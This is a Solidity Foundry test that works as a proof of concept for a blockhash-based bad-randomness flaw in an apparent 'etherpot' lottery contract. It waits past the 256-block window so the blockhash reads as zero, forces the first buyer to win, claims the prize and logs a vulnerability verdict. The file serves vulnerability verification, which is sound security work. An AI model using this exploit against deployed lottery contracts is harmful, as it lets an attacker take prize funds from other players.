// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherpot_lotto.sol";

contract LottoBadRandomnessTest is Test {
    Lotto lotto;
    address alice;
    address bob;

    function setUp() public {
        lotto = new Lotto();
        
        // Create distinct players
        alice = makeAddr("alice");
        bob = makeAddr("bob");
    }

    function testPredictableWinnerWhenBlockhashZero() public {
        // Get constants
        uint256 ticketPrice = lotto.getTicketPrice();

        // Fund players with enough for tickets and transaction costs
        deal(alice, ticketPrice * 3);
        deal(bob, ticketPrice * 3);
        uint256 initialContractBalance = address(lotto).balance;

        // Set initial block number
        vm.roll(1);

        // Buy tickets using call with sufficient gas (increased from 100k to 300k)
        vm.prank(alice);
        (bool success1,) = payable(address(lotto)).call{value: ticketPrice, gas: 300000}("");
        require(success1, "Alice purchase failed");
        assertEq(lotto.getTicketsCountByBuyer(0, alice), 1, "Alice should have 1 ticket");

        vm.prank(bob);
        (bool success2,) = payable(address(lotto)).call{value: ticketPrice, gas: 300000}("");
        require(success2, "Bob purchase failed");
        assertEq(lotto.getTicketsCountByBuyer(0, bob), 1, "Bob should have 1 ticket");

        // Verify contract received funds
        assertEq(address(lotto).balance, initialContractBalance + (ticketPrice * 2), "Contract balance incorrect");

        // Get decision block for first subpot
        uint256 decisionBlock = lotto.getDecisionBlockNumber(0, 0);
        
        // Advance beyond the 256-block hash availability window
        vm.roll(decisionBlock + 257);
        
        // Verify winner calculation uses blockhash=0
        address winner = lotto.calculateWinner(0, 0);
        assertEq(winner, alice, "First buyer should win when blockhash=0");
        
        // Prepare differential state verification
        console.log("--- BEFORE-Trigger Cash ---");
        uint256 subpot = lotto.getSubpot(0);
        uint256 winnerBalanceBefore = address(alice).balance;
        uint256 contractBalanceBefore = address(lotto).balance;
        bool isCashedBefore = lotto.getIsCashed(0, 0);
        
        console.log("Winner Balance Before: ", winnerBalanceBefore);
        console.log("Contract Balance Before: ", contractBalanceBefore);
        console.log("isCashed Before: ", isCashedBefore);
        console.log("Subpot Value: ", subpot);

        // Trigger prize claim - the critical operation
        console.log("--- Trigger Cash ---");
        vm.prank(alice);
        lotto.cash(0, 0);
        console.log("Winner claimed the prize");

        // Post-trigger state verification
        console.log("--- AFTER-Trigger Cash ---");
        uint256 winnerBalanceAfter = address(alice).balance;
        uint256 contractBalanceAfter = address(lotto).balance;
        bool isCashedAfter = lotto.getIsCashed(0, 0);
        
        console.log("Winner Balance After: ", winnerBalanceAfter);
        console.log("Contract Balance After: ", contractBalanceAfter);
        console.log("isCashed After: ", isCashedAfter);
        
        // Differential state comparison
        uint256 winnerBalanceDiff = winnerBalanceAfter - winnerBalanceBefore;
        uint256 contractBalanceDiff = contractBalanceBefore - contractBalanceAfter;
        bool balanceChangeCorrect = (winnerBalanceDiff == subpot) && (contractBalanceDiff == subpot);
        bool isCashedChanged = (isCashedAfter != isCashedBefore);
        
        console.log("Winner Balance Change: ", winnerBalanceDiff);
        console.log("Contract Balance Change: ", contractBalanceDiff);
        console.log("Subpot Transfer Correct: ", balanceChangeCorrect ? "YES" : "NO");
        console.log("isCashed Changed: ", isCashedChanged ? "YES" : "NO");
        
        // Final vulnerability verdict with reasons
        if (winner == alice && balanceChangeCorrect && isCashedChanged) {
            console.log("Vulnerability Exists: Predictable winner due to blockhash=0 condition allowed prize claim with verifiable state changes");
        } else {
            if (winner != alice) console.log("Verdict reason: Winner prediction failed - expected Alice");
            if (!balanceChangeCorrect) console.log("Verdict reason: Subpot transfer incorrect");
            if (!isCashedChanged) console.log("Verdict reason: Cash status unchanged");
            console.log("Vulnerability not Exist: Either winner prediction or claim transaction failed");
        }
    }
}